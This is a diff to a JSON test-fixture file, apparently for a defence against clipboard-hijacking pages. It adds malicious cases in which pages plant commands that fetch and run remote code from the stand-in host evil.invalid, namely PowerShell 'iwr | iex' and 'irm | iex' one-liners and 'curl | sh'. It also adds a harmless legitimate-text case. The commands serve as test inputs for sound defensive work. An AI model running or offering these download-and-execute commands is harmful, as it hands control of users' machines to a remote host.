@@ -61,7 +61,37 @@
       "command": "iex (iwr https://evil.invalid/p.txt -UseBasicParsing)",
       "expectClipboard": "placeholder",
       "pageSaw": "success",
-      "expectReadNotCommand": true
+      "expectPageRead": "command"
+    },
+    {
+      "page": "readback_readtext.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/rt | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success",
+      "expectPageRead": "command"
+    },
+    {
+      "page": "readback_read.html",
+      "trigger": "click",
+      "command": "irm https://evil.invalid/rd | iex",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success",
+      "expectPageRead": "command"
+    },
+    {
+      "page": "readback_execcommand_paste.html",
+      "trigger": "click",
+      "command": "curl -s https://evil.invalid/ep | sh",
+      "expectClipboard": "placeholder",
+      "expectPageRead": "command"
+    },
+    {
+      "page": "readback_ctrlv.html",
+      "trigger": "ctrlv",
+      "command": "iex (iwr https://evil.invalid/cv -UseBasicParsing)",
+      "expectClipboard": "placeholder",
+      "expectPageRead": "command"
     }
   ],
   "legitimate": [
@@ -99,6 +129,12 @@
       "command": "Hello, world! This is ordinary text copied from a blog post.",
       "expectClipboard": "command",
       "pageSaw": "success"
+    },
+    {
+      "page": "p2_harmless.html",
+      "trigger": "ctrlc",
+      "command": "See the installation guide for details.\n\nRead more at https://example.invalid/docs",
+      "expectClipboard": "command"
     }
   ]
 }
